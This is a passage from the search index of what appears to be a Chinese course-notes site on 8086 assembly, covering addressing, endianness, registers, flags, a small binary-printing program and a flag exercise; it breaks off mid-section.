\uff1b\u82e5\u5b83\u4eec\u7684\u504f\u79fb\u5730\u5740\u542b\u6709\u5bc4\u5b58\u5668\uff0c\u79f0\u8fd9\u79cd\u5bfb\u5740\u65b9\u5f0f\u4e3a\u95f4\u63a5\u5bfb\u5740\uff0c\u5982 <code>ds:[bx+2]</code></p> <p>\u5728\u6e90\u7a0b\u5e8f\u4e2d\uff0c\u8bbe\u67d0\u4e2a\u53d8\u91cf\u6216\u6570\u7ec4\u540d\u5b57\u4e3a <code>var</code> \uff0c\u5219\u76f4\u63a5\u5bfb\u5740\u7684\u4e00\u822c\u5f62\u5f0f\u4e3a\uff1a<code>\u6bb5\u5bc4\u5b58\u5668:var[\u5e38\u6570]</code> \u6216 <code>\u6bb5\u5bc4\u5b58\u5668:[var+\u5e38\u6570]</code> \u3002\u7ecf\u8fc7\u7f16\u8bd1\u540e\u53d8\u91cf\u540d\u6216\u6570\u7ec4\u540d\u4f1a\u66ff\u6362\u6210\u5b83\u4eec\u7684\u504f\u79fb\u5730\u5740\u3002\u4f8b\u5982\uff0c\u5047\u8bbe <code>offset s=8</code> \uff0c\u90a3\u4e48 <code>ds:[s+1]</code> , <code>ds:s[-2]</code> \u5206\u522b\u7f16\u8bd1\u6210 <code>ds:[9]</code> \u548c <code>ds:[6]</code></p> <p>8086 \u89c4\u5b9a\u7684\u95f4\u63a5\u5bfb\u5740\u4e00\u822c\u5f62\u5f0f\u4e3a\uff1a <code>\u6bb5\u5bc4\u5b58\u5668:[\u5bc4\u5b58\u56681+\u5bc4\u5b58\u56682+\u5e38\u6570]</code> \uff0c\u5176\u4e2d\u4e24\u4e2a\u5bc4\u5b58\u5668\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\u4e5f\u53ef\u4ee5\u7f3a\u5c11\u4e00\u4e2a\u3002\u4ec5\u6709 <code>BX</code>,<code>BP</code>,<code>SI</code>,<code>DI</code> \u8fd9\u56db\u4e2a\u5bc4\u5b58\u5668\u5141\u8bb8\u51fa\u73b0\u5728\u65b9\u62ec\u53f7\u4e2d\uff0c\u4e14 <code>BX</code> \u548c <code>BP</code> \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff1b<code>SI</code> \u548c <code>DI</code> \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\u3002</p> <p>\u7f3a\u7701\u6bb5\u5740</p> <p>\u82e5\u903b\u8f91\u5730\u5740\u4e2d\u7701\u7565\u6bb5\u5730\u5740\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u7f3a\u7701\u503c\uff1a</p> <ul> <li>\u76f4\u63a5\u5bfb\u5740\u65b9\u5f0f\u7f3a\u7701\u6bb5\u5740\u4e3a DS</li> <li>\u95f4\u63a5\u5bfb\u5740\u4f9d\u636e\u504f\u79fb\u5730\u5740\u662f\u5426\u542b\u6709\u5bc4\u5b58\u5668 <code>BP</code> \u533a\u5206<ul> <li>\u82e5\u6709\uff0c\u5219\u7f3a\u7701\u6bb5\u5740\u4e3a SS</li> <li>\u82e5\u65e0\uff0c\u5219\u7f3a\u7701\u6bb5\u5740\u4e3a DS</li> </ul> </li> </ul>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_4","title":"\u5c0f\u7aef\u89c4\u5219","text":"<p>Intel \u7528\u7684\u662f\u5c0f\u7aef\u5b58\u50a8\u6cd5(little-endian)\uff1a</p> <pre><code>a dd 12345678h ; \u5047\u8bbe\u5176\u5730\u5740\u5728 1000\n        \u5c0f\u7aef      \u5927\u7aef\n+1000   0x78    0x12\n+1001   0x56    0x34\n+1002   0x34    0x56\n+1003   0x12    0x78\n\n---\n\nt dw 89ABh, 0CDEFh ; t\u662f\u4e00\u4e2a\u6570\u7ec4\n;t+0 AB\n;t+1 89\n;t+2 EF\n;t+3 CD\n\nmov ax, t[2] ; \u4e5f\u53ef\u4ee5\u5199\u6210 mov ax, [t+2] \u53d6\u5230 CDEF\nmov ax, t[1] ; \u53d6\u7684\u5c31\u662f EF89 \u6240\u4ee5\u6570\u7ec4\u53d6\u7684\u65b9\u6cd5\u4e0d\u80fd\u8ddfC\u8bed\u8a00\u641e\u6df7 \n</code></pre>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_5","title":"\u5185\u5b58\u7a7a\u95f4\u5212\u5206\u548c\u663e\u5361\u5730\u5740\u6620\u5c04","text":"<p>16 \u4f4d CPU \u53ea\u80fd\u8bbf\u95ee <code>0000:0000</code> \u81f3 <code>F000:FFFF</code> \u4e4b\u95f4\u7684 1M \u5185\u5b58\u7a7a\u95f4\uff0c\u5176\u5212\u5206\u5982\u4e0b\uff1a</p> \u5730\u5740\u8303\u56f4 \u7528\u9014 <code>[0000:0000,9000:FFFF]</code> \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u7a0b\u5e8f <code>[A000:0000,A000:FFFF]</code> \u6620\u5c04\u663e\u5361\u5185\u5b58 <code>[B000:0000,B000:7FFF]</code> \u6620\u5c04\u663e\u5361\u5185\u5b58 <code>[B800:0000,B800:7FFF]</code> \u6620\u5c04\u663e\u5361\u5185\u5b58 <code>[C000:0000,F000:FFFF]</code> \u6620\u5c04 ROM <p>\u6240\u4ee5\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u7a0b\u5e8f\u603b\u5171\u53ef\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u4e3a <code>[0,9FFFF]</code> \u5171 640KB</p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_6","title":"\u5bc4\u5b58\u5668","text":"<p>8086 \u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff1a</p> <ul> <li>\u901a\u7528\u5bc4\u5b58\u5668\uff1a\u5305\u62ec <code>AX</code>,<code>BX</code>,<code>CX</code>,<code>DX</code> \uff0c\u7528\u4e8e\u7b97\u672f\u3001\u903b\u8f91\u3001\u79fb\u4f4d\u8fd0\u7b97</li> <li>\u6bb5\u5730\u5740\u5bc4\u5b58\u5668\uff1a\u5305\u62ec <code>CS</code>,<code>DS</code>,<code>ES</code>,<code>SS</code> \uff0c\u7528\u6765\u8868\u793a\u6bb5\u5730\u5740</li> <li>\u504f\u79fb\u5730\u5740\u5bc4\u5b58\u5668\uff1a\u5305\u62ec <code>IP</code>,<code>SP</code>,<code>BP</code>,<code>SI</code>,<code>DI</code> \uff0c\u7528\u6765\u8868\u793a\u504f\u79fb\u5730\u5740</li> <li>\u6807\u5fd7\u5bc4\u5b58\u5668\uff1a\u5305\u62ec <code>FL</code> \uff0c\u7528\u6765\u5b58\u50a8\u6807\u5fd7\u4f4d</li> </ul> <p>80386\u4e2d\uff0c\u9664\u4e86\u6bb5\u5bc4\u5b58\u5668\u5916\u6240\u6709\u5bc4\u5b58\u5668\u5747\u6269\u5145\u5230 32 \u4f4d\u5bbd\u5ea6\uff0c\u524d\u9762\u52a0\u4e0a <code>E</code></p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_7","title":"\u901a\u7528\u5bc4\u5b58\u5668","text":"<p>\u901a\u7528\u5bc4\u5b58\u5668\u5305\u62ec <code>AX</code>,<code>BX</code>,<code>CX</code>,<code>DX</code> \uff0c\u4f5c\u7528\u662f\u505a\u7b97\u672f\u3001\u903b\u8f91\u3001\u79fb\u4f4d\u8fd0\u7b97\u3002\u5176\u4e2d <code>AX</code> \u7684\u9ad8\u516b\u4f4d\u548c\u4f4e\u516b\u4f4d\u6210\u4e3a <code>AH</code>,<code>AL</code> \uff0c\u5176\u5b83\u5bc4\u5b58\u5668\u540c\u7406\u3002</p> <p>\u5728 80386 \u4e2d\uff0c32 \u4f4d\u5bc4\u5b58\u5668 <code>EAX</code> \u4f4e 16 \u4f4d\u5c31\u662f <code>AX</code> \uff0c\u800c\u9ad8 16 \u4f4d\u6ca1\u6709\u540d\u5b57\u3002</p> <p>\u5176\u5b9e\u547d\u540d\u4e0d\u662f\u6309\u7167\u5b57\u6bcd\u8868\u524d\u56db\u4e2a\u5b57\u6bcd\u6765\u7684\uff0c\u4e0d\u8fc7\u6211\u4eec\u5199\u7a0b\u5e8f\u7684\u65f6\u5019\u968f\u610f\u7528\u4e5f\u6ca1\u5173\u7cfb</p> <ul> <li><code>AX</code>: Accumulator \u7d2f\u52a0\u5668</li> <li><code>BX</code>: Base \u57fa\u5730\u5740\u5bc4\u5b58\u5668</li> <li><code>CX</code>: Counter \u8ba1\u6570\u5668</li> <li><code>DX</code>: Data \u6570\u636e\u5bc4\u5b58\u5668</li> </ul>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_8","title":"\u6bb5\u5730\u5740\u5bc4\u5b58\u5668","text":"<p>\u6bb5\u5730\u5740\u5bc4\u5b58\u5668\u5305\u62ec <code>CS</code>,<code>DS</code>,<code>ES</code>,<code>SS</code> </p> <ul> <li><code>CS</code> \uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668</li> <li><code>DS</code> \uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668</li> <li><code>ES</code> \uff1a\u9644\u52a0\u6bb5\u5bc4\u5b58\u5668</li> <li><code>SS</code> \uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668</li> </ul> <p>\u5176\u4e2d <code>CS</code> \u4e0d\u80fd\u7528 <code>mov</code> \u6307\u4ee4\u8d4b\u503c\uff1b<code>DS</code>,<code>ES</code>,<code>SS</code> \u53ef\u4ee5\u7528 <code>mov</code> \u8d4b\u503c\uff0c\u4f46\u6e90\u64cd\u4f5c\u6570\u4e0d\u80fd\u662f\u5e38\u6570\uff0c\u4e14\u5982\u679c\u662f\u5bc4\u5b58\u5668\u7684\u8bdd\u4ec5\u9650 <code>AX</code>,<code>BX</code>,<code>CX</code>,<code>DX</code>,<code>SP</code>,<code>BP</code>,<code>SI</code>,<code>DI</code> (\u9664 <code>IP</code> \u5916)\uff0c\u4f4d\u5bbd\u5fc5\u987b\u662f <code>word ptr</code> \u5bbd\u5ea6\u3002</p> <p>\u5982\u4f55\u628a <code>DS</code> \u8d4b\u503c\u6210 <code>CS</code> \uff1f</p> <pre><code>push cs\npop ds\n</code></pre> <p>DOS \u628a\u67d0\u4e2a EXE \u8f7d\u5165\u5230\u5185\u5b58\u540e\uff0c\u5728\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u7a0b\u5e8f\u4e4b\u524d\uff0c\u4f1a\u5bf9\u4ee5\u4e0b\u5bc4\u5b58\u5668\u8d4b\u521d\u503c\uff1a</p> <ul> <li><code>CS</code> = \u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740</li> <li><code>IP</code> = \u9996\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740</li> <li><code>SS</code> = \u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740</li> <li><code>SP</code> = \u5806\u6808\u6bb5\u7684\u957f\u5ea6</li> <li><code>DS</code> = PSP \u6bb5\u5740</li> <li><code>ES</code> = PSP \u6bb5\u5740</li> </ul> <p><code>CS:IP</code> \u5373\u6307\u5411\u5f53\u524d\u5c06\u8981\u6267\u884c\u7684\u6307\u4ee4\uff1b<code>SS:SP</code> \u6307\u5411\u5806\u6808\u9876\u7aef\uff1bPSP \u662f\u7a0b\u5e8f\u6bb5\u524d\u7f00\uff08program segment prefix\uff09\uff0c\u5b83\u662f\u4e00\u4e2a\u7531 DOS \u5206\u914d\u7ed9\u5f53\u524d EXE \u7684\uff0c\u4f4d\u4e8e\u9996\u6bb5\u4e4b\u524d\u7684\uff0c\u957f\u5ea6\u4e3a 100h \u5b57\u8282\u7684\u5185\u5b58\u5757\uff0cPSP \u4e2d\u5b58\u50a8\u4e86\u4e0e\u5f53\u524d EXE \u8fdb\u7a0b\u76f8\u5173\u7684\u4e00\u4e9b\u4fe1\u606f\u3002</p> <p>\u7531\u4e8e <code>DS</code> \u7684\u521d\u59cb\u503c\u5e76\u975e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740\uff0c\u56e0\u6b64\u5728\u7a0b\u5e8f\u521a\u5f00\u59cb\u8fd0\u884c\u65f6\u4e0d\u80fd\u7528 <code>DS</code> \u7684\u5f53\u524d\u503c\u4f5c\u4e3a\u6bb5\u5730\u5740\u53bb\u5f15\u7528\u6216\u8bbf\u95ee\u6570\u636e\u6bb5\u5185\u4efb\u4f55\u4e00\u4e2a\u53d8\u91cf\uff0c\u800c\u662f\u5e94\u8be5\u5148\u628a <code>DS</code> \u8d4b\u503c\u4e3a seg data</p> <pre><code>    mov ax, data\n    mov ds, ax\n</code></pre>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_9","title":"\u504f\u79fb\u5730\u5740\u5bc4\u5b58\u5668","text":"<p>\u504f\u79fb\u5730\u5740\u5bc4\u5b58\u5668\u5305\u62ec <code>IP</code>,<code>SP</code>,<code>BP</code>,<code>SI</code>,<code>DI</code> </p> <ul> <li><code>IP</code> \u9700\u8981\u8ddf <code>CS</code> \u642d\u914d\u6784\u6210 <code>CS:IP</code> \u6307\u5411\u5f53\u524d\u5c06\u8981\u6267\u884c\u7684\u6307\u4ee4\uff0c\u6240\u4ee5\u8be5\u5bc4\u5b58\u5668\u7684\u540d\u5b57\u4e0d\u80fd\u5728\u4efb\u4f55\u6307\u4ee4\u4e2d\u5f15\u7528</li> <li><code>SP</code> \u9700\u8981\u8ddf <code>SS</code> \u642d\u914d\u6784\u6210 <code>SS:SP</code> \u6307\u5411\u5806\u6808\u9876\u7aef\uff0c\u8be5\u5bc4\u5b58\u5668\u4e0d\u80fd\u7f6e\u4e8e [] \u5185\u7528\u4e8e\u95f4\u63a5\u5bfb\u5740</li> <li>\u5269\u4e0b\u7684\u4e09\u4e2a\u5bc4\u5b58\u5668\u53ef\u4ee5\u7528\u6765\u95f4\u63a5\u5bfb\u5740\uff0c\u4f46\u603b\u5171\u6709\u56db\u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5 Intel \u5b89\u6392\u901a\u7528\u5bc4\u5b58\u5668 <code>BX</code> \u4e5f\u53ef\u4ee5\u7528\u6765\u95f4\u63a5\u5bfb\u5740<ul> <li><code>BX</code>,<code>BP</code>,<code>SI</code>,<code>DI</code> \u56db\u4e2a\u5bc4\u5b58\u5668\u9664\u4e86\u7528\u6765\u95f4\u63a5\u5bfb\u5740\u5916\uff0c\u90fd\u53ef\u4ee5\u53c2\u4e0e\u7b97\u672f\u3001\u903b\u8f91\u3001\u79fb\u4f4d\u8fd0\u7b97</li> <li>\u5bc4\u5b58\u5668 <code>BP</code> \u9ed8\u8ba4\u8ddf\u6808\u642d\u914d\uff0c\u56e0\u6b64\u6307\u4ee4 <code>mov si, [bp+6]</code> \u7b49\u6548\u4e8e <code>mov si, word ptr ss:[bp+6]</code></li> </ul> </li> </ul> <p>\u5bc4\u5b58\u5668\u76f8\u5bf9\u5bfb\u5740\u65f6\uff0c\u65b9\u62ec\u53f7\u5185\u5fc5\u987b\u662f<code>BX,BP,SI,DI</code>\uff0c\u4e0d\u7136\u4f1a\u62a5\u9519</p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_10","title":"\u6807\u5fd7\u5bc4\u5b58\u5668","text":"<p><code>FL</code> \u662f\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c\u5b83\u91cc\u9762\u6709\u4e9b\u4f4d\u7528\u6765\u53cd\u5e94\u5f53\u524d\u6307\u4ee4\u7684\u6267\u884c\u72b6\u6001\uff0c\u79f0\u4e3a\u72b6\u6001\u6807\u5fd7\uff1b\u6709\u4e9b\u4f4d\u7528\u4e8e\u63a7\u5236 CPU\uff0c\u79f0\u4e3a\u63a7\u5236\u6807\u5fd7\uff1b\u5269\u4f59 7 \u4f4d\u662f\u4fdd\u7559\u4f4d\uff0c\u9664\u4e86\u7b2c\u4e00\u4f4d\u6052\u4e3a <code>1</code> \u5916\uff0c\u5176\u5b83\u4fdd\u7559\u4f4d\u6052\u4e3a <code>0</code>\u3002</p> <ul> <li>\u72b6\u6001\u6807\u5fd7\u5171 6 \u4e2a\uff0c\u5305\u62ec\uff1a<code>CF</code>.<code>ZF</code>,<code>SF</code>,<code>OF</code>,<code>PF</code>,<code>AF</code></li> <li>\u63a7\u5236\u6807\u5fd7\u5171 3 \u4e2a\uff0c\u5305\u62ec\uff1a<code>DF</code>,<code>IF</code>,<code>TF</code></li> </ul> <pre><code> 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|  |  |  |  |OF|DF|IF|TF|SF|ZF|  |AF|  |PF|  |CF|\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_11","title":"\u72b6\u6001\u6807\u5fd7","text":"<p>\u8fdb\u4f4d\u6807\u5fd7 CF</p> <ul> <li><code>add</code>,<code>sub</code>,<code>mul</code>,<code>imul</code> \u4ee5\u53ca\u79fb\u4f4d\u6307\u4ee4\u90fd\u4f1a\u5f71\u54cd CF\uff08Carry Flag\uff09<ul> <li>\u4e24\u6570\u76f8\u52a0\u4ea7\u751f\u8fdb\u4f4d\u65f6 CF \u7f6e 1</li> <li>\u4e24\u6570\u76f8\u51cf\u4ea7\u751f\u501f\u4f4d\u65f6 CF \u7f6e 1</li> <li>\u4e24\u6570\u76f8\u4e58\u4e58\u79ef\u8d85\u8fc7\u88ab\u4e58\u6570\u5bbd\u5ea6\u65f6 CF \u7f6e 1</li> <li>\u79fb\u4f4d\u6307\u4ee4\u6700\u540e\u79fb\u51fa\u7684\u90a3\u4e00\u4f4d\u4fdd\u5b58\u5728 CF \u4e2d</li> </ul> </li> </ul> <p>\u5982\uff0c\u53ef\u4ee5\u5229\u7528\u5e26\u8fdb\u4f4d\u52a0\u6cd5\u6307\u4ee4 <code>adc</code> \u4ee5\u53ca\u903b\u8f91\u5de6\u79fb\u6307\u4ee4 <code>shl</code> \u5b9e\u73b0\u8fdb\u5236\u8f6c\u6362\uff1a</p> <pre><code>comment @---------------------------------------------------------\n\u8be5\u6c47\u7f16\u7a0b\u5e8f\u5b9e\u73b0 16 \u4f4d\u6574\u6570\u8f6c\u6362\u6210 2 \u8fdb\u5236\u8f93\u51fa\n------------------------------------------------------------------@\ndata segment\nabc dw 00AF0h\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n    mov ax, [abc]\n    mov cx, 16 ; 16 \u6b21\u5faa\u73af\nagain:\n    shl ax, 1  ;\u903b\u8f91\u5de6\u79fb\u4e00\u4f4d\uff0c\u5f71\u54cd CF\n    mov dl, '0'\n    adc dl, 0  ;DL = DL + 0 + CF\n    push ax    ;\u628aAX\u538b\u5165\u6808(\u4fdd\u5b58ax\u72b6\u6001\uff0c\u56e0\u4e3a\u4e0b\u4e00\u6b65ah\u88ab\u4fee\u6539\u4e86)\n    mov ah, 2\n    int 21h    ;\u8f93\u51faDL\u4e2d\u7684\u5b57\u7b26\n    pop ax     ;\u6062\u590dAX\u7684\u503c(\u4e0d\u60f3\u7528\u6808\u7684\u8bdd\u76f4\u63a5\u7528bx\u5b58\u50a8\u6570\u636e\u5373\u53ef)\n    sub cx, 1\n    jnz again  ;\u82e5CX\u4e0d\u7b49\u4e8e0\uff0c\u5219\u8df3\u56de again\n    mov ah, 1\n    int 21h ; \u6572\u4efb\u610f\u952e\u7ee7\u7eed\n    mov ah, 4Ch\n    int 21h    ;return 0\ncode ends\nend main\n</code></pre> <p>\u96f6\u6807\u5fd7 ZF</p> <ul> <li>\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u3001\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u3001\u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4\u5747\u4f1a\u5f71\u54cd ZF\uff08Zero Flag\uff09<ul> <li>\u5f53\u8fd0\u7b97\u7ed3\u679c\u4e3a 0 \u65f6 ZF \u7f6e 1</li> <li>\u5f53\u8fd0\u7b97\u7ed3\u679c\u975e 0 \u65f6 ZF \u7f6e 0</li> </ul> </li> <li>\u6ce8\u610f\uff1a <code>jz</code>(jump if zero) \u548c <code>je</code>(jump if equal) \u8df3\u8f6c\u4f9d\u636e\u5747\u4e3a <code>ZF==1</code>\uff0c\u6545\u4e8c\u8005\u7b49\u4ef7\uff1b\u540c\u7406\uff0c<code>jnz</code> \u548c <code>jne</code> \u4e5f\u7b49\u4ef7</li> </ul> <p>\u7b26\u53f7\u6807\u5fd7 SF</p> <ul> <li>\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u3001\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u3001\u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4\u5747\u4f1a\u5f71\u54cd SF\uff08Sign Flag\uff09<ul> <li>\u5f53\u8fd0\u7b97\u7ed3\u679c\u4e3a\u6b63\u65f6 SF \u7f6e 0</li> <li>\u5f53\u8fd0\u7b97\u7ed3\u679c\u4e3a\u8d1f\u65f6 SF \u7f6e 1</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u76f8\u5f53\u4e8e\u8fd0\u7b97\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\uff1b\u7b26\u53f7\u6807\u5fd7\u76f8\u5173\u7684\u8df3\u8f6c\u6307\u4ee4\u53ef\u4ee5\u7528\u6765\u5224\u5b9a\u6b63\u8d1f<ul> <li><code>js</code>(jump if sign) \u4f9d\u636e\u4e3a <code>SF==1</code></li> <li><code>jns</code>(jump if no sign) \u4f9d\u636e\u4e3a <code>SF==0</code></li> </ul> </li> </ul> <p>\u6ea2\u51fa\u6807\u5fd7 OF</p> <ul> <li><code>add</code>,<code>sub</code>,<code>mul</code>,<code>imul</code>\u3001\u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4\u5747\u4f1a\u5f71\u54cd OF\uff08Overflow Flag\uff09<ul> <li>\u5f53\u4e24\u6b63\u6570\u76f8\u52a0\u53d8\u8d1f\u6570\u65f6 OF \u7f6e 1</li> <li>\u5f53\u4e24\u8d1f\u6570\u76f8\u52a0\u53d8\u6b63\u6570\u65f6 OF \u7f6e 0</li> <li>\u5f53\u4e24\u6570\u76f8\u4e58\u4e58\u79ef\u5bbd\u5ea6\u8d85\u8fc7\u88ab\u4e58\u6570\u5bbd\u5ea6\u65f6 OF \u7f6e 1\uff08\u6b64\u65f6 CF \u4e5f\u7f6e 1\uff09</li> <li>\u5f53\u4ec5\u79fb\u52a8\u4e00\u4f4d\uff0c\u4e14\u79fb\u4f4d\u524d\u6700\u9ad8\u4f4d\u4e0d\u7b49\u4e8e\u79fb\u4f4d\u540e\u6700\u9ad8\u4f4d\u65f6 OF \u7f6e 1</li> </ul> </li> </ul> <p>\u5947\u5076\u6821\u9a8c\u4f4d PF</p> <ul> <li>\u5f53\u8fd0\u7b97\u7ed3\u679c\u4f4e 8 \u4f4d\u4e2d\u4e8c\u8fdb\u5236 1 \u7684\u4e2a\u6570\u4e3a\u5076\u6570\u65f6 PF \u7f6e 1\uff1b\u5426\u5219\u7f6e 0</li> </ul> <p>\u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7 AF</p> <ul> <li>\u82e5\u6267\u884c\u52a0\u6cd5\u6307\u4ee4\u65f6\u7b2c 3 \u4f4d\u5411\u7b2c 4 \u4f4d\u4ea7\u751f\u8fdb\u4f4d\u5219 AF \u7f6e 1</li> <li>\u82e5\u6267\u884c\u51cf\u6cd5\u6307\u4ee4\u65f6\u7b2c 3 \u4f4d\u5411\u7b2c 4 \u4f4d\u4ea7\u751f\u501f\u4f4d\u5219 AF \u7f6e 1</li> <li>\u6ce8\u610f\uff1a AF\uff08Auxiliary Flag\uff09 \u5e76\u6ca1\u6709\u76f8\u5173\u8df3\u8f6c\u6307\u4ee4\uff0c\u5b83\u8ddf BCD \u7801\u8c03\u6574\u6307\u4ee4\u6709\u5173\uff0c\u5982 <code>AAA</code>,<code>AAS</code>,<code>DAA</code>,<code>DAS</code></li> </ul> \u9047\u5230\u8fd9\u79cd\u9898\u597d\u597d\u7b97\u7b97\u4e8c\u8fdb\u5236\u51cf\u6cd5\u5427 <p>\u82e5\u4ee5\u4e0b\u6307\u4ee4\u5e8f\u5217\u7684\u64cd\u4f5c\u6570\u5747\u4e3a\u7b26\u53f7\u6570\uff0c\u8bf7\u5199\u51fa\u6bcf\u4e2a\u6307\u4ee4\u5e8f\u5217\u6267\u884c\u540e\u6807\u5fd7\u4f4dCF\u3001ZF\u3001SF\u3001OF\u7684\u503c\uff0c\u5e76\u6307\u51faCMP\u6307\u4ee4\u7684\u524d\u540e\u64cd\u4f5c\u6570\u7684\u5927\u5c0f\u5173\u7cfb\u3002</p> <p>(1) mov\u00a0\u00a0al, 99h</p> <p>cmp\u00a0\u00a0al, 34h\u00a0\u00a0\u00a0\u00a0; CF=0, ZF=0, SF=0, OF=1, 99h &lt; 34h</p> <p>(2) mov\u00a0\u00a0ah, 81h</p> <p>cmp\u00a0\u00a0ah, 0FFh\u00a0\u00a0\u00a0; CF=1, ZF=0, SF=1, OF=0, 81h &lt; 0FFh</p> <p>(3) mov\u00a0\u00a0bx, 1234h</p> <p>cmp\u00a0\u00a0bx, 8086h\u00a0\u00a0; CF=1, ZF=0, SF=1, OF=1, 1234h &gt; 8086h</p> <p>(4) mov\u00a0\u00a0cx, 0FFFFh</p> <p>cmp\u00a0\u00a0cx, 0FFFEh ; CF=0, ZF=0, SF=0, OF=0, 0FFFFh &gt; 0FFFEh</p> <p>(5) mov\u00a0\u00a0dx, 3F7Dh</p> <p>cmp\u00a0\u00a0dx, 1000h\u00a0\u00a0; CF=0, ZF=0, SF=0, OF=0, 3F7Dh &gt; 1000h</p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_12","title":"\u63a7\u5236\u6807\u5fd7","text":"<p>\u65b9\u5411\u6807\u5fd7 DF</p> <ul> <li>DF\uff08Direction Flag\uff09\u7528\u6765\u63a7\u5236\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5982 <code>rep</code>,<code>movsb</code> \u7684\u8fd0\u884c\u65b9\u5411<ul> <li>\u5f53 <code>DF=0</code> \u65f6\uff0c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u6309\u6b63\u65b9\u5411\u8fd0\u884c\uff08\u5148\u64cd\u4f5c\u4f4e\u5730\u5740\u518d\u64cd\u4f5c\u9ad8\u5730\u5740\uff09</li> <li>\u5f53 <code>DF=1</code> \u65f6\uff0c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u6309\u53cd\u65b9\u5411\u8fd0\u884c\uff08\u5148\u64cd\u4f5c\u9ad8\u5730\u5740\u518d\u64cd\u4f5c\u4f4e\u5730\u5740\uff09</li> </ul> </li> <li>\u6ce8\u610f\uff1a <code>cld</code>(clear direction) \u6307\u4ee4\u8bbe\u7f6e <code>DF=0</code>\uff1b<code>std</code>(set direction) \u6307\u4ee4\u8bbe\u7f6e <code>DF=1</code></li> <li>\u901a\u5e38\uff0c\u82e5\u6e90\u9996\u5730\u5740\u5c0f\u4e8e\u76ee\u6807\u9996\u5730\u5740\uff0c\u5219\u7f6e <code>DF</code> \u4e3a 1\uff1b\u76f8\u5e94\u7684\uff0c\u82e5\u6e90\u9996\u5730\u5740\u5927\u4e8e\u76ee\u6807\u9996\u5730\u5740\uff0c\u5219\u7f6e <code>DF</code> \u4e3a 0</li> </ul> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u5e0c\u671b\u5c06\u4f4d\u4e8e <code>1000</code> \u5904\u7684\u5b57\u7b26\u4e32 <code>ABCDE</code> \u590d\u5236\u5230\u5730\u5740 <code>1002</code> \u5904\uff0c\u5982\u679c\u6211\u4eec\u8bbe\u7f6e <code>DF=0</code> \u7684\u8bdd\uff1a</p> <pre><code>Before copy:\n    Source      Destination\n     +---+      +---+\n 1000|'A'|  1002|   |\n     +---+      +---+\n 1001|'B'|  1003|   |\n     +---+      +---+\n 1002|'C'|  1004|   |\n     +---+      +---+\n 1003|'D'|  1005|   |\n     +---+      +---+\n 1004|'E'|  1006|   |\n     +---+      +---+\n-------------------------------------\nAfter copy:\n    Source      Destination\n     +---+      +---+\n 1000|'A'|  1002|'A'|\n     +---+      +---+\n 1001|'B'|  1003|'B'|\n     +---+      +---+\n 1002|'A'|  1004|'A'|\n     +---+      +---+\n 1003|'B'|  1005|'B'|\n     +---+      +---+\n 1004|'A'|  1006|'A'|\n     +---+      +---+\n-------------------------------------\nWell, the right answer is when DF = 1:\n    Source      Destination\n     +---+      +---+\n 1000|'A'|  1002|'A'|\n     +---+      +---+\n 1001|'B'|  1003|'B'|\n     +---+      +---+\n 1002|'A'|  1004|'C'|\n     +---+      +---+\n 1003|'B'|  1005|'D'|\n     +---+      +---+\n 1004|'C'|  1006|'E'|\n     +---+      +---+\n</code></pre> <p>\u4e2d\u65ad\u6807\u5fd7 IF</p> <ul> <li>IF\uff08Interrupt 